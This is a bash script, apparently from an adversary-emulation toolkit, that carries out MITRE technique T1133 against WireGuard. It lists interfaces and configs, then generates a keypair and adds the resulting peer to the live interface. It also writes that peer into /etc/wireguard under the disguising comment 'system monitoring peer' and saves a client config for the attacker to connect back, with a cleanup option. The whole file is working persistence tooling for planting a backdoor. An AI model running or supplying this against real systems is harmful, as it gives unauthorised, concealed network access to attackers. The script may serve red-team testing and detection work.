#!/bin/bash
# T1133 — External Remote Services: WireGuard Peer Injection
# Inject attacker's key as authorized WireGuard peer for persistent VPN access

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_wireguard"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1133 — WireGuard Peer Injection            ║"
    echo "  ║   Persistent encrypted VPN tunnel access      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

enum_wireguard() {
    echo -e "${CYAN}[*] Enumerating WireGuard configuration...${NC}"
    echo ""

    # Check for wg interfaces
    echo -e "  ${YELLOW}Active WireGuard interfaces:${NC}"
    if command -v wg &>/dev/null; then
        wg show 2>/dev/null | while read -r line; do
            echo -e "    ${GREEN}${line}${NC}"
        done
    else
        ip link show type wireguard 2>/dev/null | while read -r line; do
            echo -e "    ${GREEN}${line}${NC}"
        done
    fi

    # Config files
    echo ""
    echo -e "  ${YELLOW}Configuration files:${NC}"
    find /etc/wireguard -name "*.conf" 2>/dev/null | while read -r f; do
        echo -e "    ${GREEN}${f}${NC}"
        echo -e "    $(grep -i "address\|endpoint\|allowedips" "$f" 2>/dev/null | sed 's/^/      /')"
    done

    # Systemd wireguard services
    echo ""
    echo -e "  ${YELLOW}WireGuard systemd services:${NC}"
    systemctl list-units --type=service 2>/dev/null | grep -i "wg\|wireguard" | \
        while read -r line; do echo -e "    ${GREEN}${line}${NC}"; done
}

inject_peer() {
    echo -e "${CYAN}[*] Injecting attacker peer into WireGuard${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v wg &>/dev/null; then
        echo -e "${RED}[!] wg command not found${NC}"; return
    fi

    # Find active interface
    local IFACE
    IFACE=$(wg show interfaces 2>/dev/null | head -1)
    if [[ -z "$IFACE" ]]; then
        read -p "  WireGuard interface name: " IFACE
        [[ -z "$IFACE" ]] && { echo -e "${RED}[!] No interface specified${NC}"; return; }
    fi
    echo -e "  Using interface: ${GREEN}${IFACE}${NC}"

    mkdir -p "$WORKDIR"

    echo ""
    echo -e "${YELLOW}[*] Generating keypair for attacker...${NC}"

    # Generate attacker keypair
    local PRIVKEY PUBKEY
    PRIVKEY=$(wg genkey)
    PUBKEY=$(echo "$PRIVKEY" | wg pubkey)

    echo -e "  ${GREEN}Private key: ${PRIVKEY}${NC}"
    echo -e "  ${GREEN}Public key:  ${PUBKEY}${NC}"

    # Save keys for attacker
    echo "$PRIVKEY" > "${WORKDIR}/attacker_private.key"
    echo "$PUBKEY" > "${WORKDIR}/attacker_public.key"
    chmod 600 "${WORKDIR}/attacker_private.key"

    # Determine allowed IP for new peer
    local PEER_IP
    read -p "  IP for attacker peer (e.g., 10.0.0.99/32): " PEER_IP
    [[ -z "$PEER_IP" ]] && PEER_IP="10.0.0.99/32"

    # Add peer to live interface
    wg set "$IFACE" peer "$PUBKEY" allowed-ips "$PEER_IP" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to add peer${NC}"; return
    fi

    echo -e "${GREEN}[+] Peer added to live interface ${IFACE}${NC}"

    # Persist in config file
    local CONFFILE="/etc/wireguard/${IFACE}.conf"
    if [[ -f "$CONFFILE" ]]; then
        cat >> "$CONFFILE" << PEOF

# ${MARKER} - system monitoring peer
[Peer]
PublicKey = ${PUBKEY}
AllowedIPs = ${PEER_IP}
PersistentKeepalive = 25
PEOF
        echo -e "${GREEN}[+] Peer persisted in ${CONFFILE}${NC}"
    fi

    # Generate attacker config file
    local SERVER_PUBKEY SERVER_ENDPOINT
    SERVER_PUBKEY=$(wg show "$IFACE" public-key 2>/dev/null)
    SERVER_ENDPOINT=$(wg show "$IFACE" endpoints 2>/dev/null | awk '{print $2}' | head -1)

    cat > "${WORKDIR}/attacker_wg.conf" << AEOF
# WireGuard config for attacker to connect to target
[Interface]
PrivateKey = ${PRIVKEY}
Address = ${PEER_IP}
DNS = 8.8.8.8

[Peer]
PublicKey = ${SERVER_PUBKEY}
Endpoint = ${SERVER_ENDPOINT:-TARGET_IP:51820}
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
AEOF

    echo ""
    echo -e "${GREEN}[+] Attacker config saved: ${WORKDIR}/attacker_wg.conf${NC}"
    echo -e "${YELLOW}[*] Transfer this config to attacker machine and run:${NC}"
    echo -e "    wg-quick up ${WORKDIR}/attacker_wg.conf"
    echo ""
    echo -e "${YELLOW}[*] Attacker will have encrypted tunnel access to the network${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up WireGuard injection...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Remove our peer from live interface
    if [[ -f "${WORKDIR}/attacker_public.key" ]]; then
        local PUBKEY IFACE
        PUBKEY=$(cat "${WORKDIR}/attacker_public.key")
        IFACE=$(wg show interfaces 2>/dev/null | head -1)
        [[ -n "$IFACE" ]] && wg set "$IFACE" peer "$PUBKEY" remove 2>/dev/null
    fi

    # Remove from config
    for conf in /etc/wireguard/*.conf; do
        [[ -f "$conf" ]] && sed -i "/${MARKER}/,/^$/d" "$conf" 2>/dev/null
    done

    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] WireGuard injection cleaned up${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Enumerate WireGuard configuration"
    echo -e "  ${CYAN}[2]${NC} Inject attacker peer"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) enum_wireguard ;;
        2) inject_peer ;;
        3) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
